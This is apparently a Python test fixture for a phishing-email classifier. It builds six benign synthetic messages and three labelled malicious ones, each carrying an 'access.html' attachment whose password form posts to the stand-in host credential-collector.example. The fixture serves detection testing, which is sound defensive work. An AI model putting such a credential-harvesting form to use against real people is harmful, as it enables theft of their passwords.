"""Independent synthetic evaluation examples. These do not establish real-inbox accuracy."""

from mail_calibration import message

from services.parsers.mail.common import RawAttachment


def examples():
    benign = [
        ("supplier_invoice", "Invoice for completed work", "Attached is the invoice for the completed maintenance. Our bank details are unchanged."),
        (
            "supplier_bank_merger",
            "Bank merger notification",
            "Our account number changes next month. Verify with your established contact before updating payment details.",
        ),
        ("it_maintenance", "Scheduled Microsoft 365 maintenance", "Teams maintenance is scheduled for Sunday. No action or password change is required."),
        (
            "internal_digest",
            "Weekly security digest",
            "This week's training covers phishing, password resets and invoice fraud. Visit the usual intranet from your bookmarks.",
        ),
        ("share_notification", "A document was shared with you", "Your colleague shared the monthly report. Open your usual SharePoint portal to find it."),
        ("renewal", "Subscription renewal reminder", "Your subscription renews on 30 September. Manage it through your existing account dashboard."),
    ]
    rows = [{"name": name, "label": "benign", "row": message(subject, body)} for name, subject, body in benign]
    # The same authenticated, familiar supplier can send a credential-stealing attachment.
    for name, title in [("supplier_harvest", "Updated invoice"), ("it_harvest", "Document access"), ("newsletter_harvest", "Download the monthly digest")]:
        rows.append(
            {
                "name": name,
                "label": "malicious",
                "row": message(
                    title,
                    attachments=[
                        RawAttachment(
                            "access.html",
                            b'<html><form action="https://credential-collector.example/submit"><input type="password" name="password"><button>Open</button></form></html>',
                        )
                    ],
                ),
            }
        )
    return rows
